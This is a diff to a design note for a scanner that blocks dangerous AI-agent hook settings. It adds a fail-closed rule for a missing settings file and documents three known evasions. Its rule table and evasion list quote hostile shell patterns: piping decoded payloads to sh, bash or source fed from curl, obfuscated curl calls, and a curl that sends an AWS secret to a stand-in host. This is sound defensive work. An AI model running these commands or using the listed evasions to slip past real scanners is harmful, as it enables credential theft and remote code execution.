@@ -41,7 +41,7 @@ assumption of its own — which is the single design constraint everything below
 
 ## Rules
 
-Eight blocking, one advisory. Each carries its rationale inline in the source.
+Nine blocking, one advisory. Each carries its rationale inline in the source.
 
 | Rule | Blocks on |
 |---|---|
@@ -53,7 +53,25 @@ Eight blocking, one advisory. Each carries its rationale inline in the source.
 | `obfuscated-exec` | `base64 -d \| sh`, `xxd -r -p \| sh` |
 | `guard-tamper` | removing/truncating `.git/hooks`, `core.hooksPath`, deleting `block-secrets.sh`, command-position `SKIP_SECRETS=1`, `--no-verify` |
 | `hardcoded-credential` | length-anchored AWS/GitHub/Slack/GitLab/OpenAI/GCP key formats, PEM headers, DSN with inline password |
+| `missing-surface` *(opt-in, `--require-surface`)* | there is no `.claude/settings*.json` to scan at all — see below |
 | `unpinned-plugin-marketplace` *(advise)* | a marketplace source with no `ref`/`commit`/`tag`/`rev`/`version`/`sha` |
+
+## Fail closed on an absent surface — added 2026-08-26, before merge
+
+The first shipped version returned zero findings and exited 0 when `.claude/settings.json` was
+absent: pointed at an empty directory it printed *"no agent hook surface in this repo — all clear"*.
+A pull request that deleted or renamed the settings file would have turned the gate **green**.
+
+That is AIS-03's own failure mode — a check that skips and still reports success — rebuilt inside the
+tool written to correct it. Worth stating plainly in the article: **the reflex that produces a
+skip-and-pass gate is not an upstream defect, it is the default shape of a check.** Nothing about
+knowing the failure prevented reproducing it; only running the tool against a directory with nothing
+in it did.
+
+The fix is deliberately not a special case. `--require-surface` pushes an ordinary blocking
+`Finding`, so an absent surface flows through the allowlist, `--json` and the exit code exactly like
+malicious hook content does. Both CI job templates pass the flag; the default stays off, because an
+ad-hoc local scan of an unrelated directory must not fail.
 
 ## The four calibration decisions
 
@@ -90,6 +108,16 @@ gate flags its own guard stops reading the gate.
   source, so the finding may have no available remedy, and a gate whose finding cannot be fixed gets
   disabled rather than fixed. It is reported and counted. If a pinning mechanism turns out to exist,
   flip `UNPINNED_ADVISORY` and the rule becomes a gate with no other change.
+- **Three known evasions, measured on the merged scanner and left open on purpose.**
+  `curl http://host/?k=$AWS_SECRET_ACCESS_KEY` produces **zero** findings — `credential-read` matches
+  file paths, not environment variables, and `exfil-http` needs a data flag, so a GET carrying the
+  secret in the query string (the most natural exfiltration from a hook) is missed.
+  `source <(curl …)` slips past while `bash <(curl …)` is caught. And `exfil-http` fires on
+  `curl -X POST http://localhost:3000/health`, which is a false positive waiting to happen in any
+  repo whose hooks talk to a local service. Each needs its own test and a re-run of the negative
+  control on the real hook surface before the rule widens: widening `exfil-http` to bare `curl` with
+  a variable is how a gate starts flagging its own secret-guard, which is calibration decision 1 all
+  over again.
 - **This is content matching, not analysis.** Shell fragmentation defeats it —
   `f=$(printf '\x63url'); $f …` — exactly as it defeats `block-secrets.sh`, whose own header says so.
   It is one layer: a reviewer reading a diff is another, and CODEOWNERS routing that review (W1.3) is
